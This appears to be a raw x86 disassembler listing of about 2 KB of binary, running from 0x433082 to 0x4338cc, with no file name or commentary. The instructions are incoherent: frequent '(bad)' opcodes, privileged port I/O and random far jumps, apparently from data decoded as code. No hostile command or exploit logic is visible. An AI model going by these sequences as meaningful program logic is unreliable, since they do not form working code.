  433082:	xor    eax,0x13191de2
  433087:	rol    BYTE PTR ds:0x4c9496d4,cl
  43308d:	ins    BYTE PTR es:[edi],dx
  43308e:	ins    DWORD PTR es:[edi],dx
  43308f:	aas    
  433090:	fs lahf 
  433092:	pop    ds
  433093:	push   ss
  433094:	repz loop 0x433023
  433097:	pop    ebp
  433098:	sbb    BYTE PTR [ecx+0x1a],cl
  43309b:	adc    ah,dl
  43309d:	cmp    esi,DWORD PTR [ecx-0x64640822]
  4330a3:	cdq    
  4330a4:	cmp    cl,ch
  4330a6:	cmp    al,0x58
  4330a8:	xchg   DWORD PTR [edx+0x4460765c],edi
  4330ae:	mov    al,0x24
  4330b0:	pusha  
  4330b1:	adc    eax,0x41757c6a
  4330b6:	sub    bh,0xe7
  4330b9:	lahf   
  4330ba:	into   
  4330bb:	push   ecx
  4330bc:	dec    ebx
  4330bd:	jmp    0x4fe67df3
  4330c2:	sbb    cl,BYTE PTR [eax+0x6ffbcb03]
  4330c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4330c9:	mov    dl,0xd2
  4330cb:	in     al,dx
  4330cc:	sub    al,0xad
  4330ce:	test   ax,0x919
  4330d2:	inc    esp
  4330d3:	cwde   
  4330d4:	inc    edx
  4330d5:	int3   
  4330d6:	push   edi
  4330d7:	add    eax,DWORD PTR [ecx]
  4330d9:	mov    ds:0x1bb37a1b,al
  4330de:	mov    dh,0x6c
  4330e0:	sub    DWORD PTR [edx-0x25aba84a],ecx
  4330e6:	mov    edx,0x94f0ec94
  4330eb:	mov    ecx,0xf4e90f35
  4330f0:	data16 data16 (bad) 
  4330f3:	mov    ebx,0xb4f8a244
  4330f8:	xchg   esp,eax
  4330f9:	cmp    DWORD PTR [ecx-0x7],edx
  4330fc:	add    DWORD PTR gs:[edx-0x4df883b0],0xffffffa0
  433104:	sub    DWORD PTR [esi-0x2d],ebx
  433107:	(bad)  ds:0x79dcbb12
  43310d:	xor    eax,0x19181a33
  433112:	or     al,0xac
  433114:	lea    edi,[ecx]
  433116:	jne    0x4330d8
  433118:	fcom   QWORD PTR [ecx-0x24]
  43311b:	ja     0x43316d
  43311d:	mov    cl,0xe6
  43311f:	in     eax,dx
  433120:	cmp    eax,0xd604bf71
  433125:	jge    0x433164
  433127:	and    al,BYTE PTR [ebp+0x2bf0611c]
  43312d:	cld    
  43312e:	fadd   DWORD PTR [edi-0xe59a41b]
  433134:	dec    ecx
  433135:	sub    ebp,DWORD PTR gs:[ecx+esi*8]
  433139:	mov    bh,BYTE PTR [ecx]
  43313b:	add    BYTE PTR [edi],dl
  43313d:	sbb    DWORD PTR ds:0xaf98f9b2,ebp
  433143:	inc    edi
  433144:	mov    esp,0xafff2b9f
  433149:	jae    0x433180
  43314b:	retf   
  43314c:	mov    ebx,0xad91e93d
  433151:	mov    bh,0x96
  433153:	xchg   ebp,eax
  433154:	pop    ss
  433155:	ins    DWORD PTR es:[edi],dx
  433156:	(bad)  
  433157:	retf   
  433158:	sbb    ecx,DWORD PTR [esi]
  43315a:	mov    ebx,0xdb9bff26
  43315f:	fs mov eax,0x6ee409a6
  433165:	mov    dl,0x7a
  433167:	in     eax,dx
  433168:	jle    0x433136
  43316a:	mov    edx,0x75115a34
  43316f:	push   edi
  433170:	cmp    BYTE PTR [esi-0x1b],cl
  433173:	lods   eax,DWORD PTR ds:[esi]
  433174:	inc    ebp
  433175:	mov    ch,0x26
  433177:	out    dx,al
  433178:	sub    BYTE PTR [esi+0x59],bl
  43317b:	sub    esp,edi
  43317d:	pop    ds
  43317e:	mov    esp,0x77936b24
  433183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433184:	push   esi
  433185:	mov    ebp,0xb49f2202
  43318a:	gs sub ebp,esi
  43318d:	pop    ebx
  43318e:	mov    dl,0x7e
  433190:	push   edi
  433191:	jecxz  0x433143
  433193:	push   esp
  433194:	mov    eax,0x672213ac
  433199:	inc    edi
  43319a:	add    ebx,ecx
  43319c:	mov    es,WORD PTR [esi+0x3a8ecdad]
  4331a2:	mov    edx,0xf789171c
  4331a7:	push   edx
  4331a8:	mov    dl,0xd0
  4331aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4331ab:	daa    
  4331ac:	mov    edx,0x818f1bce
  4331b1:	fcom   QWORD PTR [eax-0x6f]
  4331b4:	call   0x6b69:0x249b80d1
  4331bb:	sub    eax,0x4f6d5a8f
  4331c0:	push   0x7b
  4331c2:	aas    
  4331c3:	fbld   TBYTE PTR [ebx]
  4331c5:	leave  
  4331c6:	ret    
  4331c7:	bound  esp,QWORD PTR [eax]
  4331c9:	push   ebx
  4331ca:	mov    bl,0xcf
  4331cc:	cmp    eax,esp
  4331ce:	pop    ebp
  4331cf:	and    eax,0x64cce0f2
  4331d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4331d5:	mov    ebx,0x1f06bf26
  4331da:	cmp    eax,DWORD PTR [ecx+ebx*4]
  4331dd:	mov    dh,0x55
  4331df:	lahf   
  4331e0:	adc    eax,0xdeec0620
  4331e5:	or     DWORD PTR [eax],edx
  4331e7:	clc    
  4331e8:	sbb    BYTE PTR [ecx],cl
  4331ea:	mov    BYTE PTR [esi+0x3f23a257],ah
  4331f0:	or     BYTE PTR [edi-0x5f0a72e3],0x23
  4331f7:	cwde   
  4331f8:	imul   edi,ebx,0x5c
  4331fb:	ds cli 
  4331fd:	jmp    0x6d96:0xe517b5ba
  433204:	adc    esp,DWORD PTR [edi]
  433206:	lds    ebx,FWORD PTR [edi+0x68]
  433209:	or     al,0x1b
  43320b:	test   al,0x85
  43320d:	add    DWORD PTR [edi-0x5b1c2218],esi
  433213:	cmp    eax,0x44b443c0
  433218:	jbe    0x43324a
  43321a:	cmp    bl,BYTE PTR [edx-0x1b]
  43321d:	and    bl,al
  43321f:	jmp    0x3cb3d84b
  433224:	sbb    al,0x39
  433226:	mov    eax,0x860473e2
  43322b:	pop    eax
  43322c:	jg     0x4331fd
  43322e:	imul   edx,DWORD PTR [eax+0x1d],0xffffffa8
  433232:	sub    BYTE PTR [edi-0x6a],bl
  433235:	xchg   esi,eax
  433236:	jge    0x4331d1
  433238:	pop    ds
  433239:	stc    
  43323a:	cmp    DWORD PTR [edx],edi
  43323c:	pop    edi
  43323d:	lods   al,BYTE PTR ds:[esi]
  43323e:	push   ecx
  43323f:	adc    ch,BYTE PTR [ebx+0x2cb5aba5]
  433245:	pop    ecx
  433246:	xchg   esi,eax
  433247:	out    0xcd,eax
  433249:	enter  0xc77c,0xeb
  43324d:	idiv   DWORD PTR [ebx-0x1b82133c]
  433253:	cld    
  433254:	xchg   esp,eax
  433255:	lahf   
  433256:	mov    ebp,DWORD PTR [edx]
  433258:	ret    0x4fdd
  43325b:	lock mov eax,0x99c90b73
  433261:	jbe    0x43321d
  433263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433264:	add    eax,0xb5abc120
  433269:	fidiv  WORD PTR [edx]
  43326b:	in     eax,dx
  43326c:	outs   dx,DWORD PTR ds:[esi]
  43326d:	jne    0x4331f6
  43326f:	fbld   TBYTE PTR [edx]
  433271:	mov    DWORD PTR [edx],esp
  433273:	sub    eax,0xe1824ae0
  433278:	sub    ah,BYTE PTR [edx-0x5ee789e5]
  43327e:	cmc    
  43327f:	gs push 0x63320ac9
  433285:	dec    ebp
  433286:	lods   eax,DWORD PTR ds:[esi]
  433287:	repz sub ebp,DWORD PTR [edx+esi*4]
  43328b:	inc    esp
  43328c:	adc    al,0xd0
  43328e:	push   0x7245f57a
  433293:	out    dx,al
  433294:	sub    edx,DWORD PTR [esi]
  433296:	stc    
  433297:	sti    
  433298:	sbb    ecx,ecx
  43329a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43329b:	jmp    0x3491:0xd7fdb34
  4332a2:	jmp    0x153:0x4a12133
  4332a9:	mov    ds:0xb0f821de,eax
  4332ae:	jb     0x43328b
  4332b0:	adc    al,0xfd
  4332b2:	mov    bl,0x14
  4332b4:	in     al,0x64
  4332b6:	lods   eax,DWORD PTR ds:[esi]
  4332b7:	ror    cl,0x4e
  4332ba:	pop    ds
  4332bb:	ret    0xa4c1
  4332be:	imul   ebp,DWORD PTR [edi+ecx*2-0x26],0x5d
  4332c3:	mov    ebp,0x465cb8a6
  4332c8:	xchg   DWORD PTR gs:[ecx+0x16388584],edi
  4332cf:	mov    edx,0xf39ff435
  4332d4:	int    0x87
  4332d6:	iret   
  4332d7:	mov    edx,0xc82d9925
  4332dc:	frstor [ecx+edx*8-0x45b69f4]
  4332e3:	mov    dh,0x48
  4332e5:	xor    BYTE PTR [edi],0x41
  4332e8:	ja     0x433288
  4332ea:	pop    edx
  4332eb:	les    ecx,FWORD PTR [ecx-0x60]
  4332ee:	jnp    0x43333a
  4332f0:	xchg   esi,eax
  4332f1:	xchg   ebx,eax
  4332f2:	into   
  4332f3:	mov    cl,0xe1
  4332f5:	popa   
  4332f6:	iret   
  4332f7:	mov    ch,0x5
  4332f9:	mov    dl,0xcd
  4332fb:	xor    al,0x1c
  4332fd:	stc    
  4332fe:	jle    0x433316
  433300:	adc    al,BYTE PTR ds:0xc07b07f2
  433306:	add    ecx,DWORD PTR [esi+ebx*8+0xc]
  43330a:	(bad)  
  43330b:	repz mov esi,0x1639d479
  433311:	cmc    
  433312:	mov    edi,0x466b99f2
  433318:	aas    
  433319:	rol    BYTE PTR [edi+0xf],0x1f
  43331d:	push   edx
  43331e:	stos   BYTE PTR es:[edi],al
  43331f:	(bad)  
  433320:	mov    esi,0x55bc4dbc
  433325:	jo     0x433390
  433327:	jmp    0x5bc7:0xce8d7b32
  43332e:	fisubr DWORD PTR [ecx+edx*2-0x10]
  433332:	test   DWORD PTR [esi+esi*1+0x53],esi
  433336:	pushf  
  433337:	mov    dh,0xe
  433339:	jecxz  0x4332f8
  43333b:	hlt    
  43333c:	sub    BYTE PTR [ecx-0x25723555],ah
  433342:	loope  0x4332d6
  433344:	mov    ds:0x145d2655,eax
  433349:	dec    ebx
  43334a:	push   ebx
  43334b:	pop    eax
  43334c:	sahf   
  43334d:	fnsave [eax-0x7a]
  433350:	fstp   TBYTE PTR [ecx-0x49]
  433353:	push   esp
  433354:	and    eax,edx
  433356:	mov    WORD PTR [esi],?
  433358:	js     0x433367
  43335a:	int    0x74
  43335c:	loopne 0x43332a
  43335e:	mov    esp,0x17a92070
  433363:	cmp    edi,ecx
  433365:	and    BYTE PTR [ebp+ecx*4-0x12981f2b],0xe6
  43336d:	adc    BYTE PTR [eax],0x28
  433370:	dec    ecx
  433372:	je     0x4333ec
  433374:	sub    esp,DWORD PTR [esi-0x3bf6a0a9]
  43337a:	lahf   
  43337b:	add    BYTE PTR ds:0xaceb05f8,al
  433381:	jmp    0xaee1:0xfc0da026
  433388:	std    
  433389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43338a:	sti    
  43338b:	and    eax,0x8d0b6f99
  433390:	and    al,0x60
  433392:	mov    DWORD PTR [ecx],edi
  433394:	cli    
  433395:	mov    esi,ebp
  433397:	inc    sp
  433399:	hlt    
  43339a:	mov    esi,0xfcfcc844
  43339f:	jno    0x4333f8
  4333a1:	mov    gs,WORD PTR [ebx+ecx*1+0x499f351c]
  4333a8:	out    dx,al
  4333a9:	ror    BYTE PTR [edi+0x65],cl
  4333ac:	xchg   ebx,eax
  4333ad:	es mov ecx,0xbc084bb4
  4333b3:	shl    DWORD PTR [ebx+eiz*4+0x6292cacb],0xa8
  4333bb:	rcl    ecx,1
  4333bd:	enter  0xea5e,0x22
  4333c1:	sbb    DWORD PTR [ebx+0x4],edi
  4333c4:	es loope 0x433418
  4333c7:	scas   eax,DWORD PTR es:[edi]
  4333c8:	jnp    0x43341f
  4333ca:	cld    
  4333cb:	ds sbb eax,0xd0100ee0
  4333d1:	mov    BYTE PTR [ebx-0x78c6e994],dh
  4333d7:	sub    esi,eax
  4333d9:	sbb    al,0x3b
  4333db:	xchg   ebx,eax
  4333dc:	imul   esp,DWORD PTR [edi+0x3f1accfb],0x74
  4333e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4333e4:	xor    al,BYTE PTR [edx-0x3a0934d]
  4333ea:	mov    edx,0xc480a464
  4333ef:	(bad)  
  4333f0:	gs inc esi
  4333f2:	sbb    esp,edi
  4333f4:	jp     0x4333b2
  4333f6:	sbb    eax,0x1fbcf9ed
  4333fb:	(bad)  
  4333fc:	in     eax,dx
  4333fd:	dec    esi
  4333fe:	dec    edx
  4333ff:	icebp  
  433400:	test   al,0xad
  433402:	push   ecx
  433403:	xor    ebp,edx
  433405:	test   BYTE PTR [edx+0x1ece76f2],ch
  43340b:	sti    
  43340c:	sbb    cl,ch
  43340e:	in     eax,dx
  43340f:	loope  0x4333c6
  433411:	push   0xffffffc2
  433413:	test   DWORD PTR [ebp-0x6c],0xe30f5c1a
  43341a:	sti    
  43341b:	arpl   WORD PTR [ecx-0x33],sp
  43341e:	ret    
  43341f:	sub    ah,BYTE PTR ds:0x699b9939
  433425:	lea    ebp,[esi-0x21]
  433428:	adc    eax,0xf2e734ab
  43342d:	pop    ebp
  43342e:	rcl    BYTE PTR [ebx],1
  433430:	fstp   QWORD PTR [esi-0x104a0d9e]
  433436:	dec    esp
  433437:	repz push edi
  433439:	mov    esp,0x9e3801f1
  43343e:	jno    0x433493
  433440:	inc    ebp
  433441:	aad    0xf6
  433443:	out    0x79,eax
  433445:	inc    edx
  433446:	push   ebp
  433447:	push   edi
  433448:	push   0x15
  43344a:	mov    edx,0x6a255874
  43344f:	jns    0x433427
  433451:	sub    al,0xef
  433453:	adc    ch,al
  433455:	into   
  433456:	bound  esp,QWORD PTR [edi+ebp*1]
  433459:	mov    cl,0xba
  43345b:	mov    al,ds:0xec71393f
  433460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433461:	and    eax,0x81b36e36
  433466:	sub    eax,0xb80d66e9
  43346b:	cmp    BYTE PTR [edx-0x208ea459],ch
  433471:	sbb    eax,0xa9185e87
  433476:	call   0x73e978a6
  43347b:	mov    edx,0x286d919c
  433480:	push   ebp
  433481:	mov    eax,ds:0x706ec743
  433486:	ins    BYTE PTR es:[edi],dx
  433487:	adc    ebp,DWORD PTR [ecx+0x19]
  43348a:	mov    al,ds:0x6dfe828
  43348f:	push   edi
  433490:	or     edi,DWORD PTR [edx+0xb]
  433493:	lods   eax,DWORD PTR ds:[esi]
  433494:	rcr    edx,1
  433496:	ret    
  433497:	cld    
  433498:	(bad)  
  433499:	out    0x8,eax
  43349b:	add    eax,0xbbad9ad7
  4334a0:	test   DWORD PTR [ecx],ebp
  4334a2:	xchg   esi,eax
  4334a3:	in     eax,0x98
  4334a5:	call   0x367d:0xbb8be61f
  4334ac:	xor    BYTE PTR [eax-0x4e],0xd0
  4334b0:	mov    ecx,0x68621d8b
  4334b5:	mov    eax,ds:0xd5cfdb9f
  4334ba:	xchg   BYTE PTR [ecx+0x1f],cl
  4334bd:	fnstenv [ecx]
  4334bf:	(bad)  
  4334c0:	cli    
  4334c1:	lds    edx,FWORD PTR [ebx+0x1b9f7280]
  4334c7:	dec    ebp
  4334c8:	aaa    
  4334c9:	mov    WORD PTR [esi+ecx*1+0x318c9e12],es
  4334d0:	xor    bl,BYTE PTR [ecx]
  4334d2:	lods   al,BYTE PTR ds:[esi]
  4334d3:	in     eax,0x4d
  4334d5:	pop    esp
  4334d6:	or     al,0xf3
  4334d8:	cwde   
  4334d9:	pushf  
  4334da:	mov    ebx,0x64d8d9d7
  4334df:	or     BYTE PTR [edi-0x4a22cd3f],ah
  4334e5:	test   eax,0x81e7b4b2
  4334ea:	mov    ss,WORD PTR [ebx]
  4334ec:	xchg   ebp,eax
  4334ed:	or     edx,DWORD PTR [ebx-0x10]
  4334f0:	in     al,0x84
  4334f2:	push   es
  4334f3:	xor    BYTE PTR ds:0x61835d9,bl
  4334f9:	pusha  
  4334fa:	pop    ds
  4334fb:	(bad)  
  4334fc:	jmp    0x4334a0
  4334fe:	sub    ebx,edi
  433500:	sub    al,0x17
  433502:	popa   
  433503:	mov    DWORD PTR [edi+0x4f],esi
  433506:	cmp    dh,ah
  433508:	jecxz  0x4334dc
  43350a:	out    0x44,al
  43350c:	shl    DWORD PTR [esi+0x10df1198],0x2c
  433513:	ror    DWORD PTR [eax+0xace0342],0x9f
  43351a:	sar    DWORD PTR [eax+0x4f],cl
  43351d:	test   al,0x7
  43351f:	jo     0x4334b6
  433521:	xor    BYTE PTR [edx-0xd],ch
  433524:	shl    bl,0xcc
  433527:	imul   esi
  433529:	mov    edx,0xf92454f9
  43352e:	into   
  43352f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433530:	inc    ebp
  433531:	icebp  
  433532:	out    dx,al
  433533:	cmp    BYTE PTR [eax+0x5273c6c],bl
  433539:	fdivr  QWORD PTR [edi-0x1a]
  43353c:	jae    0x43359d
  43353e:	repnz dec esp
  433540:	cmp    ah,0xba
  433543:	xchg   esp,eax
  433544:	rcr    BYTE PTR [esi+0x1d059298],0x8f
  43354b:	in     al,dx
  43354c:	jp     0x433585
  43354e:	jmp    0x433515
  433550:	call   0xbd9:0x23e2129b
  433557:	iret   
  433558:	jmp    0x4335cc
  43355a:	ins    BYTE PTR es:[edi],dx
  43355b:	xchg   esp,eax
  43355c:	sbb    eax,0x18dae167
  433561:	mov    ecx,0xc9148c77
  433566:	jle    0x43350b
  433568:	push   ebp
  433569:	mov    ecx,0xb41c26a4
  43356e:	push   0x47
  433570:	(bad)  
  433571:	je     0x433537
  433573:	out    0xc7,eax
  433575:	mov    ds:0xbef5ae55,eax
  43357a:	daa    
  43357b:	hlt    
  43357c:	cmp    esp,edi
  43357e:	(bad)  
  433580:	shl    DWORD PTR [esi-0x42],1
  433583:	in     al,0x81
  433585:	mov    eax,ds:0x3255ff02
  43358a:	daa    
  43358b:	repz or al,0xc7
  43358e:	inc    edi
  43358f:	int    0x16
  433591:	leave  
  433592:	(bad)  
  433593:	mov    ebp,DWORD PTR ds:0xeddd9bf8
  433599:	sbb    eax,0xcde5480a
  43359e:	jnp    0x4335aa
  4335a0:	addr16 inc edi
  4335a2:	mov    edi,0xb224a901
  4335a7:	dec    esp
  4335a8:	arpl   sp,sp
  4335aa:	dec    ecx
  4335ab:	stos   DWORD PTR es:[edi],eax
  4335ac:	out    0x3a,al
  4335ae:	mov    al,0x74
  4335b0:	mov    ds:0xd557f387,al
  4335b5:	mov    ds:0x2793a6ab,al
  4335ba:	inc    esi
  4335bb:	cmp    BYTE PTR [ecx],cl
  4335bd:	inc    eax
  4335be:	(bad)  [ecx+0x60]
  4335c1:	mov    eax,ds:0x76e7283b
  4335c6:	out    0x99,al
  4335c8:	pushf  
  4335c9:	scas   eax,DWORD PTR es:[edi]
  4335ca:	cmp    eax,DWORD PTR [ebx]
  4335cc:	xchg   al,bl
  4335ce:	pop    esi
  4335cf:	das    
  4335d0:	stos   BYTE PTR es:[edi],al
  4335d1:	fwait
  4335d2:	ds ja  0x4335f4
  4335d5:	mov    DWORD PTR [ebx+0x37],ebx
  4335d8:	and    bl,BYTE PTR [edx]
  4335da:	lds    esp,FWORD PTR [esi+edi*2]
  4335dd:	sahf   
  4335de:	fistp  DWORD PTR [ecx-0x52]
  4335e1:	shl    DWORD PTR [ebp+ebp*2+0x29],0xa2
  4335e6:	and    ecx,edx
  4335e8:	or     BYTE PTR [esi],al
  4335ea:	sub    dh,BYTE PTR [ebp-0x367c7ee4]
  4335f0:	(bad)  
  4335f1:	call   0xd348:0xbc61d06b
  4335f8:	sub    eax,0x160cc6a8
  4335fd:	fst    DWORD PTR [edi-0x24]
  433600:	xchg   esi,eax
  433601:	(bad)  
  433602:	jbe    0x43361e
  433604:	mov    fs,WORD PTR [edi+0x320763b]
  43360a:	int    0x30
  43360c:	ins    BYTE PTR es:[edi],dx
  43360d:	rcl    ecx,cl
  43360f:	push   cs
  433610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433611:	test   eax,0x9e8494b0
  433616:	ja     0x43360e
  433618:	in     al,0xa1
  43361a:	cmp    ecx,DWORD PTR [eax]
  43361c:	enter  0x372c,0x91
  433620:	arpl   WORD PTR [esp+edx*2],bp
  433623:	shl    bh,cl
  433625:	in     al,dx
  433626:	mov    ebp,0xeebeaa24
  43362b:	inc    ebp
  43362c:	dec    ecx
  43362d:	fstp   st(5)
  43362f:	push   0xffffffbc
  433631:	mov    eax,ds:0x5070a673
  433636:	push   ebp
  433637:	sbb    al,0xf0
  433639:	cmp    al,0x56
  43363b:	xchg   esi,eax
  43363c:	stc    
  43363d:	sahf   
  43363e:	mov    bl,0x78
  433640:	sbb    edx,DWORD PTR [ecx+esi*2+0x44]
  433644:	mov    BYTE PTR [eax-0x33],ch
  433647:	outs   dx,BYTE PTR ds:[esi]
  433648:	sbb    bh,dh
  43364a:	mov    bh,0xee
  43364c:	std    
  43364d:	mov    eax,ds:0x5ec48f63
  433652:	shl    DWORD PTR [ebx-0x6b494ace],0xa8
  433659:	daa    
  43365a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43365b:	lahf   
  43365c:	add    eax,0x1ef129e8
  433661:	pushf  
  433662:	xchg   edx,eax
  433663:	loope  0x4336db
  433665:	sub    ch,dl
  433667:	std    
  433668:	loope  0x4336e8
  43366a:	mov    ch,0xf4
  43366c:	xchg   edi,eax
  43366d:	add    eax,0x802524eb
  433672:	adc    al,0xe5
  433674:	xor    eax,0x2c020d94
  433679:	jmp    0x70f085fe
  43367e:	cmp    DWORD PTR [ebx-0x32],ecx
  433681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433682:	jae    0x43361f
  433684:	psrlw  mm3,mm3
  433687:	out    0x14,al
  433689:	push   esp
  43368a:	repz pop ebp
  43368c:	pop    ss
  43368d:	inc    ebp
  43368e:	adc    BYTE PTR [eax+0x6a98a831],bh
  433694:	div    BYTE PTR [edi]
  433696:	in     al,0x1c
  433698:	xchg   ecx,eax
  433699:	scas   al,BYTE PTR es:[edi]
  43369a:	sub    al,BYTE PTR [ebp+0x4978511d]
  4336a0:	mov    ebx,0xecaf7b9e
  4336a5:	fisttp DWORD PTR [esi-0x41f33584]
  4336ab:	test   DWORD PTR [ebx-0x1cb4df5],0xc6243067
  4336b5:	mov    eax,0x9932cf1b
  4336ba:	sar    DWORD PTR [edi-0x2776c95d],cl
  4336c0:	rol    BYTE PTR [edx-0x1cf55a8f],cl
  4336c6:	mov    eax,0x351dceb4
  4336cb:	pop    ecx
  4336cc:	mov    ch,0x4
  4336ce:	xor    ah,dh
  4336d0:	arpl   WORD PTR [eax-0x58],sp
  4336d3:	add    al,0x1e
  4336d5:	leave  
  4336d6:	xchg   edi,eax
  4336d7:	xor    esp,DWORD PTR [edi-0xc]
  4336da:	jb     0x433705
  4336dc:	jmp    0x433717
  4336de:	lahf   
  4336df:	pop    ds
  4336e0:	and    BYTE PTR [ecx+0x13],ah
  4336e3:	add    DWORD PTR [eax],esi
  4336e5:	cli    
  4336e6:	aad    0x3b
  4336e8:	mov    bh,0xec
  4336ea:	jmp    DWORD PTR [edx-0x15768373]
  4336f0:	call   0x151:0xe7786dd0
  4336f7:	fiadd  WORD PTR [ecx-0x6c]
  4336fa:	nop
  4336fb:	jmp    0x433684
  4336fd:	sub    BYTE PTR fs:[edi+0x64b19c7c],bl
  433704:	sub    bl,BYTE PTR [ecx]
  433706:	daa    
  433707:	add    esp,DWORD PTR [esi+0x3c]
  43370a:	loope  0x43371d
  43370c:	int3   
  43370d:	mov    bl,0xe6
  43370f:	sbb    eax,0x20dba106
  433714:	es mov esi,0x4b25a10f
  43371a:	mov    edi,0xec8a27e7
  43371f:	test   eax,0xe456a91d
  433724:	mov    al,BYTE PTR [edx-0x5ee30f0b]
  43372a:	mov    ebx,0x6f7f317a
  43372f:	mov    ds:0xb61c7af5,al
  433734:	and    dl,ch
  433736:	mov    eax,0x30362584
  43373b:	xchg   ebp,eax
  43373c:	cmc    
  43373d:	pop    ss
  43373e:	push   ds
  43373f:	call   0xc5856e3c
  433744:	sbb    eax,0x81136699
  433749:	call   0xcc30:0x199fe9b4
  433750:	and    DWORD PTR [ecx-0x52],edi
  433753:	and    dh,BYTE PTR [edi]
  433755:	cmp    ecx,DWORD PTR [esi-0x54d6b0cd]
  43375b:	sbb    DWORD PTR [ebp+ecx*1+0xa3285e1],0x13e5f02e
  433766:	cld    
  433767:	jo     0x433791
  433769:	jmp    FWORD PTR [eax-0x46c29d87]
  43376f:	out    dx,al
  433770:	and    DWORD PTR [ecx+0x208e048f],edi
  433776:	mov    al,0x68
  433778:	popf   
  433779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43377a:	jnp    0x4337f2
  43377c:	jns    0x4337cb
  43377e:	push   ss
  43377f:	push   ecx
  433780:	dec    ebx
  433781:	fisub  WORD PTR [esi+0x53]
  433784:	jnp    0x43371c
  433786:	mov    ebp,0xc04ff4b4
  43378b:	or     esp,DWORD PTR [esi]
  43378d:	push   edi
  43378e:	clc    
  43378f:	mov    dl,0x3b
  433791:	cld    
  433792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433793:	cmp    al,0x1
  433795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433796:	mov    cl,0x84
  433798:	enter  0x50a1,0xa4
  43379c:	(bad)  
  43379d:	mov    dl,0x40
  43379f:	(bad)  
  4337a0:	sbb    edx,edi
  4337a2:	leave  
  4337a3:	dec    ebp
  4337a4:	adc    edx,ebx
  4337a6:	xchg   ebp,eax
  4337a7:	call   0x7d60:0x94b087fd
  4337ae:	and    eax,0xe3615e2
  4337b3:	repz jmp 0x433747
  4337b6:	shr    DWORD PTR [ecx],cl
  4337b8:	and    eax,0x27a3e859
  4337bd:	arpl   WORD PTR ds:0xd389ffdd,sp
  4337c3:	xor    DWORD PTR [ebp-0x301a10ab],edx
  4337c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4337ca:	repnz mov bh,0x99
  4337cd:	lods   al,BYTE PTR ds:[esi]
  4337ce:	push   edx
  4337cf:	mov    bh,0xf9
  4337d1:	lahf   
  4337d2:	ret    
  4337d3:	shl    DWORD PTR [ebx-0x7706f043],1
  4337d9:	push   0xc19f7f5d
  4337de:	push   0x78973561
  4337e3:	in     al,dx
  4337e4:	addr16 jnp 0x43382b
  4337e7:	rcr    BYTE PTR [edi],1
  4337e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4337ea:	mov    esi,0xd6d043d4
  4337ef:	mov    ecx,0xf2d5cf65
  4337f4:	and    edx,ecx
  4337f6:	adc    al,0x22
  4337f8:	nop
  4337f9:	pusha  
  4337fa:	jo     0x4337a7
  4337fc:	aaa    
  4337fd:	xchg   edx,eax
  4337fe:	mov    cl,0x44
  433800:	cwde   
  433801:	xor    al,0xae
  433803:	adc    DWORD PTR ds:0xf9e8ad4e,esi
  433809:	imul   edx,DWORD PTR [edx*1+0x2f90f924],0xf6a4bfc2
  433814:	push   ss
  433815:	pop    eax
  433816:	out    dx,eax
  433817:	outs   dx,DWORD PTR ds:[esi]
  433818:	cli    
  433819:	aam    0xa5
  43381b:	iret   
  43381c:	or     al,0xe
  43381e:	mov    esp,0xc016c894
  433823:	xor    al,0x7b
  433825:	pop    edi
  433826:	mov    esi,0x96d703b4
  43382b:	mov    esp,0xe6b55995
  433830:	(bad)  
  433831:	aad    0xf8
  433833:	(bad)  
  433834:	sub    ch,BYTE PTR [ecx]
  433836:	in     eax,dx
  433837:	pop    es
  433838:	mov    ecx,0x5bdd6af0
  43383d:	mov    ch,0x43
  43383f:	xor    BYTE PTR [ebp+0x18],0x16
  433843:	out    dx,al
  433844:	mov    edx,0x1c759cf1
  433849:	test   eax,0x84503425
  43384e:	mov    eax,DWORD PTR [ecx-0x23]
  433851:	jg     0x43385f
  433853:	jp     0x433888
  433855:	ss ret 0xe90b
  433859:	pop    ebx
  43385a:	mov    edx,0x5e591f9a
  43385f:	ret    0x7579
  433862:	or     eax,0xeb9fd23b
  433867:	pop    ecx
  433868:	add    DWORD PTR [eax+0x17],esi
  43386b:	or     dl,bh
  43386d:	pop    esp
  43386e:	sub    eax,0x3d02b994
  433873:	sbb    bl,BYTE PTR [edi]
  433875:	mov    ecx,0x79b7d9f1
  43387a:	and    ebx,DWORD PTR [edx+0x5ec43076]
  433880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433882:	les    eax,FWORD PTR [eax+0x6]
  433885:	in     al,dx
  433886:	xor    eax,0xb72ff415
  43388b:	and    al,0xbc
  43388d:	retf   0x991d
  433890:	test   BYTE PTR gs:[ebx-0xc],al
  433894:	adc    eax,DWORD PTR [esi]
  433896:	in     al,dx
  433897:	add    eax,0xe37f50b8
  43389c:	and    al,BYTE PTR [ebx]
  43389e:	gs int3 
  4338a0:	pop    edx
  4338a1:	test   al,0x11
  4338a3:	(bad)  
  4338a4:	sahf   
  4338a5:	sbb    al,0xaf
  4338a7:	in     al,dx
  4338a8:	mov    esi,0xa1157ab2
  4338ad:	daa    
  4338ae:	fxch   st(6)
  4338b0:	cld    
  4338b1:	cdq    
  4338b2:	cmp    esi,DWORD PTR [ecx]
  4338b4:	inc    esp
  4338b5:	jno    0x433873
  4338b7:	mov    dl,0x34
  4338b9:	aad    0xbc
  4338bb:	fistp  QWORD PTR [eax-0x467b2589]
  4338c1:	mov    al,ds:0x12149d69
  4338c6:	mov    bl,0xff
  4338c8:	jne    0x433881
  4338ca:	fucomip st,st(6)
  4338cc:	mov    cl,0xee
